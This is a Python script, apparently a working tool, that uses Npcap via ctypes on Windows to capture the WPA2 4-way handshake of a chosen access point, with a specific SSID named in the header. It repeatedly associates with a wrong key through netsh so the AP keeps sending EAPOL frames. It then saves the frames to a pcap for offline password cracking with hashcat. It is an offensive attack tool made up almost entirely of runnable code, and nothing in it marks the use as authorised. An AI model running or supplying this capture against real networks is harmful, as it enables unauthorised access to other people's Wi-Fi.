# capture.py - grab the WPA2 4-way handshake of ChinaNet-k6Jf via Npcap (wpcap.dll, ctypes)
#
# How this works (and why it needs no monitor mode):
#   We deliberately associate with the AP using a WRONG key. The AP still starts the
#   4-way handshake: it unicasts EAPOL M1 (with its ANonce) to us, and the Windows
#   supplicant answers with M2 (carrying our SNonce + MIC computed from the wrong key).
#   The handshake aborts at MIC verification, but M1+M2 already give us everything
#   hashcat needs (ANonce/SNonce/MIC/MACs). No deauth, no packet injection.
#   EAPOL is allowed through the 802.1X controlled port, so the frames reach NDIS
#   and our Npcap filter sees a copy even though the link never comes up.

import ctypes
import os
import struct
import subprocess
import sys
import threading
import time

# ---- runtime parameters (never hardcode a real network here) ----
#   --ssid / RK_SSID    target AP name (required)
#   RK_IFACE            substring of the adapter GUID (default: first 802.11 NIC)
#   RK_PCAP             output pcap path
#   RK_SECONDS          capture duration
SSID = os.environ.get("RK_SSID", "")
IFACE_GUID = os.environ.get("RK_IFACE", "")
OUT = os.environ.get("RK_PCAP", "handshake.pcap")
CAPTURE_SECONDS = int(os.environ.get("RK_SECONDS", "75"))

for _i, _a in enumerate(sys.argv):
    if _a == "--ssid" and _i + 1 < len(sys.argv):
        SSID = sys.argv[_i + 1]
if not SSID:
    sys.exit("target SSID required: python capture.py --ssid <SSID>  (or set RK_SSID)")

# ---------- load wpcap ----------
def load_wpcap():
    dirs = [r"C:\Windows\System32\Npcap", r"C:\Windows\System32"]
    last = None
    for d in dirs:
        p = os.path.join(d, "wpcap.dll")
        if os.path.exists(p):
            try:
                if hasattr(os, "add_dll_directory"):
                    os.add_dll_directory(d)
                return ctypes.CDLL(p)
            except OSError as e:
                last = e
    raise RuntimeError("wpcap.dll not found (Npcap not installed?) %s" % (last,))

wp = load_wpcap()


class timeval(ctypes.Structure):
    _fields_ = [("tv_sec", ctypes.c_long), ("tv_usec", ctypes.c_long)]


class pcap_pkthdr(ctypes.Structure):
    _fields_ = [("ts", timeval), ("caplen", ctypes.c_uint), ("len", ctypes.c_uint)]


class pcap_if(ctypes.Structure):
    pass


pcap_if._fields_ = [
    ("next", ctypes.POINTER(pcap_if)),
    ("name", ctypes.c_char_p),
    ("description", ctypes.c_char_p),
    ("addresses", ctypes.c_void_p),
    ("flags", ctypes.c_uint),
]

wp.pcap_findalldevs.restype = ctypes.c_int
wp.pcap_findalldevs.argtypes = [ctypes.POINTER(ctypes.POINTER(pcap_if)), ctypes.c_char_p]
wp.pcap_open_live.restype = ctypes.c_void_p
wp.pcap_open_live.argtypes = [ctypes.c_char_p, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_char_p]
wp.pcap_next_ex.restype = ctypes.c_int
wp.pcap_next_ex.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.POINTER(pcap_pkthdr)),
                            ctypes.POINTER(ctypes.POINTER(ctypes.c_ubyte))]
wp.pcap_datalink.restype = ctypes.c_int
wp.pcap_datalink.argtypes = [ctypes.c_void_p]
wp.pcap_close.restype = None
wp.pcap_close.argtypes = [ctypes.c_void_p]
try:
    wp.pcap_set_rfmon.restype = ctypes.c_int
    wp.pcap_set_rfmon.argtypes = [ctypes.c_void_p, ctypes.c_int]
except AttributeError:
    pass


def pick_device():
    err = ctypes.create_string_buffer(256)
    devs = ctypes.POINTER(pcap_if)()
    if wp.pcap_findalldevs(ctypes.byref(devs), err) != 0:
        raise RuntimeError("pcap_findalldevs failed: %s" % err.value)
    chosen = None
    d = devs
    while d:
        name = d.contents.name.decode(errors="ignore") if d.contents.name else ""
        desc = d.contents.description.decode(errors="ignore") if d.contents.description else ""
        print("  dev: %-52s | %s" % (name, desc[:60]))
        if (IFACE_GUID and IFACE_GUID in name) or "802.11" in desc:
            if chosen is None:
                chosen = name
        d = d.contents.next
    return chosen


def sh(args):
    return subprocess.run(args, capture_output=True)


def trigger_thread(stop):
    """Repeatedly kick a doomed association so the AP keeps sending us EAPOL M1."""
    time.sleep(3)
    for round_no in range(1, 8):
        if stop.is_set():
            return
        sys.stdout.write("[trigger] round %d: connect with wrong key\n" % round_no)
        sys.stdout.flush()
        sh(["netsh", "wlan", "disconnect"])
        time.sleep(1.5)
        sh(["netsh", "wlan", "connect", "ssid=" + SSID, "name=" + SSID])
        for _ in range(10):
            if stop.is_set():
                return
            time.sleep(1)
    sys.stdout.write("[trigger] done\n")


def main():
    dev = pick_device()
    if not dev:
        print("!! wireless adapter not found among Npcap devices")
        return 1
    print("[*] capturing on %s" % dev)

    err = ctypes.create_string_buffer(256)
    handle = wp.pcap_open_live(dev.encode(), 65535, 1, 1000, err)
    if not handle:
        print("!! pcap_open_live failed: %s" % err.value)
        return 1

    dlt = wp.pcap_datalink(handle)
    print("[*] datalink = %d" % dlt)

    # pcap file: global header + per-packet records
    with open(OUT, "wb") as f:
        f.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, dlt))

        stop = threading.Event()
        t = threading.Thread(target=trigger_thread, args=(stop,))
        t.daemon = True
        t.start()

        hdr_p = ctypes.POINTER(pcap_pkthdr)()
        data_p = ctypes.POINTER(ctypes.c_ubyte)()
        deadline = time.time() + CAPTURE_SECONDS
        total = 0
        eapol = 0
        while time.time() < deadline:
            rc = wp.pcap_next_ex(handle, ctypes.byref(hdr_p), ctypes.byref(data_p))
            if rc != 1:
                continue
            h = hdr_p.contents
            caplen = h.caplen
            buf = ctypes.string_at(data_p, caplen)
            total += 1
            # find EAPOL (ethertype 0x888e at offset 12 for Ethernet DLT=1)
            is_eapol = False
            if len(buf) >= 16 and buf[12:14] == b"\x88\x8e":
                is_eapol = True
            elif dlt in (105, 113, 127, 163):  # raw 802.11 / radiotap / prism
                if b"\x88\x8e" in buf[:64] or b"\xaa\xaa\x03\x00\x00\x00\x88\x8e" in buf:
                    is_eapol = True
            if is_eapol:
                eapol += 1
                print("[EAPOL] frame #%d len=%d" % (eapol, caplen))
            rec = struct.pack("<IIII", int(h.ts.tv_sec), int(h.ts.tv_usec), caplen, h.len)
            f.write(rec)
            f.write(buf)

        stop.set()
        wp.pcap_close(handle)
        f.flush()

    print("[*] captured %d packets, %d EAPOL -> %s" % (total, eapol, OUT))
    return 0 if eapol else 2


if __name__ == "__main__":
    sys.exit(main())
